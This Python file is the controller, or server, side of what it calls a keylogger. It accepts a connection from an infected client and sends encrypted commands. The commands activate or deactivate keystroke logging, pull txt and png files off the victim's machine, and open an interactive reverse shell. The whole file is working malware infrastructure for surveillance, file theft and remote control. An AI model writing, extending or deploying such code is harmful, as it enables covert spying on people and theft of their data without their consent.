# -*- coding: utf-8 -*-
import logging
import utils
from socket import socket

key = b'\xe9\xcex8\x01\x98\xc5Z\xed\xd0F\xff\xff\xff\xff\xff'
host = "127.0.0.1"
port = 1005

#logging.basicConfig(level=logging.DEBUG) # Show Console Output
logging.basicConfig(level=logging.WARN) # Dont show Console Output
reverse_shell_active = False

sock = socket()
sock.bind((host, port))

sock.listen(5)  # listen for client connection. The number stands for: number of unaccepted connections that the system will allow before refusing new connections
conn, addr = sock.accept()  # Establish connection with client. conn: new socket object used to send and receive data. addr address bound to the socket of the client.
print('Got connection from', addr)

def print_usage():
    print("Usage:")
    print("help:        Print this usage message")
    print("activate:    Activate the logging")
    print("deactivate:  Deactivate the logging")
    print("send:        Send txt and png files to the server")
    print("shell:       Activate reverse-shell. Enter \"exit\" to deactivate")
    print("exit:        Terminate client and server")
    
while True:
    if reverse_shell_active:
        inpt = input("shell>")
    else:
        inpt = input("enter command:")
        
    if inpt:
        if inpt == "help":
            print_usage()
            
        elif inpt == "exit" and not reverse_shell_active:
            print("stopping server")
            break
        else:
            conn.sendall(utils.encrypt(inpt.encode(utils.ENCODING)))

            recv = utils.decrypt(conn.recv(utils.BUFFSIZE))
            if recv:
                header = recv.decode(utils.ENCODING).split("__")
                logging.debug(f"header {header}")

                if len(header) == 2: # If len is 2, the header contains a filename. In this case its a file and will be handled as one
                    filename, chunk_size = header[0], int(header[1])
                    print("Receiving File:", filename, "chunk_size:", chunk_size)

                    data = b""
                    for i in range(chunk_size):
                        recv = utils.decrypt(conn.recv(utils.BUFFSIZE))
                        if recv:
                            data += recv
                    print("Data received")
                    utils.convert_bytes_to_file(data=data, filename=filename, path=".")

                elif len(header) == 1: # If len is 1, the header just contains chunk_size and thus will not be converted to a file.
                    chunk_size = int(header[0])
                    msg = b""
                    for i in range(chunk_size):
                        recv = utils.decrypt(conn.recv(utils.BUFFSIZE))
                        if recv:
                            msg += recv
                    msg = msg.decode(utils.ENCODING)
                        
                    if msg == "keylogger stopped":
                        print("keylogger stopped. good bye!")
                        break
                    elif msg == "logging activated":
                        print("logging activated")
                    elif msg == "logging deactivated":
                        print("logging deactivated")
                    elif msg == "reverse shell activated":
                        reverse_shell_active = True
                    elif msg == "reverse shell deactivated":
                        reverse_shell_active = False
                    elif msg == "received":
                        pass
                    else:
                        print(msg)

conn.close()
print("Connection closed.")
